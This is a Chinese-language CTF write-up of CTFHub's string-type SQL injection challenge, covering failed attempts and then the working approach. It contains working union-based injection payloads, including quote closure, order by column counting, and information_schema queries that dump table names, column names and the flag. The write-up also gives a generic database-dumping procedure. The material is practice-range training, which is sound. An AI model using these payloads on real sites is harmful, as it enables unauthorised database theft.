# CTFHub Writeup - 字符型注入 

## 题目类型

WEB

## 题目描述

打开题目，点开链接后，页面出现一个大标题写着SQL 字符型注入

左边有一个文本输入框，里面有灰色的提示字：输入1试试？

右边紧挨着一个绿色的按钮，写着 Search

# 解题过程

## 踩坑过程：

我对题目名称进行了分析，并且输入1点搜索后，页面红字显示 select * from news where id='1'

数据回显：红字下方显示 ID: 1，Data: ctfhub

输入 1'，页面回显SQL语句变成 id='1''，页面直接空白

确认是字符型，需要把后面的单引号弄掉

在输入框中输入 1' order by 3 --+

页面回显SQL语句显示 id='1' order by 3 --+'，页面空白/报错

意识到是不是列数不对？决定改小一点试试

继续用 --+ 换列数

输入 1' order by 2 --+

页面回显SQL语句显示 id='1' order by 2 --+'，页面依然空白

说明--+ 这个注释符在这题彻底废了

于是我改用 %23（URL编码的 #）手动注释


在输入框手动输入 1' order by 2 %23

页面回显SQL语句变成了 id='1' order by 2 %23'，页面继续空白

明明URL编码了，为什么后面还有个单引号？（因为浏览器把 % 二次转义成了 %25，根本没变成井号）

于是我启用逻辑闭合大法 and '1'='1

输入 1' order by 3 and '1'='1

页面回显SQL语句显示 id='1' order by 3 and '1'='1'，页面居然正常回显了 ID: 1，Data: ctfhub！ 

继续输入 1' order by 100 and '1'='1

页面回显SQL语句显示 id='1' order by 100 and '1'='1'，页面依然正常回显 Data: ctfhub

意识到这明显出现了错误

但仍然继续输入 -1' union select 1,2,3 and '1'='1去测回显点

页面回显SQL语句显示 id='-1' union select 1,2,3 and '1'='1'，页面直接空白，查无此数据

意识到此路径错误决定尝试新路径

## 新路径：

于是我清空输入框，直接输入 1' #，点击 Search

页面回显SQL语句显示 id='1' #'，页面成功恢复正常，显示 ID: 1，Data: ctfhub

避免前面的错误我选择了用 # 测列数

输入 1' order by 2 #，点击 Search

页面回显页面正常显示 ID: 1，Data: ctfhub

接着输入 1' order by 3 #，点击 Search

页面回显空白/报错，确认最终列数为 2 列

输入 -1' union select 1,2 #，为寻找黄金回显点

页面成功显示 ID: 1 和 Data: 2

最后一大步联合查询脱库：

查表名：

• 输入 -1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，点击 Search

• 页面回显了啥：Data: flag,news

查字段名：
• 输入 -1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' #，点击 Search

• 页面回显了啥：Data: flag 
拿到 Flag：

• 输入 -1' union select 1,flag from flag #，点击 Search

• 页面回显了啥：正确的Flag

# 笔记

## 失败原因：

1.盲目套用上一题经验，--+ 

因为上一道整数型注入是用 --+ 注释成功的，理所当然地在字符型里也输入了 1' order by 3 --+

在这个特定的靶场环境里，--+ 被后端忽略或者被浏览器吃了，没有起到注释作用。

导致原代码尾部多出来的那个单引号依然存在，破坏了 SQL 语法，所以页面直接空白。

2.在输入框里手动敲 %23，被浏览器二次转义

听说 # 在 URL 里要编码成 %23，在输入框里老老实实输入了 1' order by 2 %23。

当点击 Search 时，浏览器会把 % 再次转义成 %25。

结果传到后端的其实是 %23 这几个纯文本，根本没变成井号，后端的单引号还是没被注释掉，页面继续空白。 

3.启用 and '1'='1 闭合，制造了“逻辑运算”的乌龙

避开注释符，改用 1' order by 3 and '1'='1 来测试

在 SQL 里，and 的优先级非常高。

数据库实际执行的是 order by (3 and '1'='1')，而这个逻辑运算的结果是 1。

所以不管你写 order by 3 还是 order by 100，加上后面的 and '1'='1，

实际上都变成了 order by 1（排序第一列，永远不报错）。

4.被乌龙误导，得出了“表有100多列”的荒谬结论

你在坑 3 的基础上输入了 1' order by 100 and '1'='1，发现居然也正常回显。

没有意识到这是逻辑运算（坑 3）带来的假象，反而相信了眼前的“事实”——以为这个表真的有100多列。

这个错误的认知，直接把后面测试回显点的方向带歪了。

5.基于错误认知去测列数，导致 union select 直接炸裂

由于坚信表有3列（甚至100列），你输入了 -1' union select 1,2,3 and '1'='1 试图找黄金回显点。

union select 要求前后查询的列数必须严格一致。

这个表实际上只有 2 列，你强行写 3 列，数据库直接报错罢工，页面再次陷入空白。

6.每改一次 Payload，页面就空白一次。

由于前面所有的错误（注释符失效、URL编码被转义、逻辑运算干扰），

页面回显的红色 SQL 语句其实都在告诉你真相（比如 %23 原样显示、id='1'' 多出引号），

但当时信息量太大，没能从报错信息里反推出“注释根本没生效”这个核心问题，导致一直在原地打转。

## 这道题主要学习了：

1. 字符型注入 vs 整数型注入的本质区别

• 整数型：后端代码是 id=$id（无引号）。注入时不需要考虑闭合，直接 and 1=1 即可。

• 字符型：后端代码是 id='$id'（有引号包裹）。你输入的 payload 必须先闭合前面的单引号，再注释掉后面的单引号，否则 SQL 语法必然报错。

2. SQL 注入的完整攻击链（标准套路）

无论什么注入，万变不离其宗：

• 探测漏洞：1' 测闭合，and '1'='1 和 and '1'='2 测逻辑真伪。

• 测列数：用 order by N 确认字段数（确认 union select 需要写几个数字）。

• 找回显点：用 -1' union select 1,2 # 找到页面能显示数据的位置（黄金广告位）。

• 脱库：查库名（database()） → 查表名（information_schema.tables） → 查字段名（information_schema.columns） → 拿数据。

3. MySQL 系统的“户口本” information_schema

• 你学会了通过这个系统库，用 SQL 语句去查询“这个库叫什么”、“库里有什么表”、“表里有什么列”，这是脱库的核心。

4. 注释符的多样性与环境差异

• 标准注释符：-- （杠杠空格）和 #（井号）。

• 避坑经验：并不是所有环境都吃 --+。你踩坑证明了在这个靶场里 --+ 失效，必须换用 1' # 才能成功闭合。

• 核心规则：永远在输入框直接敲 #，不要手动打 %23。让浏览器自己去处理 URL 编码，否则浏览器二次转义 % 变成 %25，会导致你的注释符变成纯文本。 

5. 运算符优先级与逻辑运算的陷阱

• 踩了一个经典的坑：1' order by 3 and '1'='1。

• 以为写的是“按第3列排序，并且 1=1”，但数据库实际按优先级执行的是 order by (3 and '1'='1')。
由于 3 and true 的结果是 1，所以不管写 order by 100 and '1'='1，实际执行的永远都是 order by 1（不报错）。

• 教训：测试列数时，严禁在 order by 后面拼接逻辑条件，否则会产生“多少列都不报错”的幻觉。

6. 联合查询（UNION）的严格列数要求

• 你在坑里输入了 union select 1,2,3，页面炸了。因为该表真实只有 2 列。

• 规则：union select 前后的查询结果列数必须完全一致，否则数据库直接报错。

7. 浏览器地址栏与输入框的区别

• 在输入框里输入空格和 #，浏览器会自动在 URL 中把它们编码为 %20（或 +）和 %23。

• 在地址栏里手动输入 %23，浏览器会二次编码为 %2523，传给后端变成了 %23 这几个字符，数据库不认识它，导致注入失败。

8. 从红色 SQL 回显中排查错误

• 这道题的靶场非常友好，它会把你输入的 payload 拼成完整的 SQL 语句，用红字显示出来。

• 复盘你的踩坑：当你输入 1' order by 2 %23 时，红字显示了 id='1' order by 2 %23'。

这其实已经告诉你答案了——%23 根本没被当做注释符，后面那个单引号依然还在。学会看这行红字，能帮你省去 80% 的试错时间。
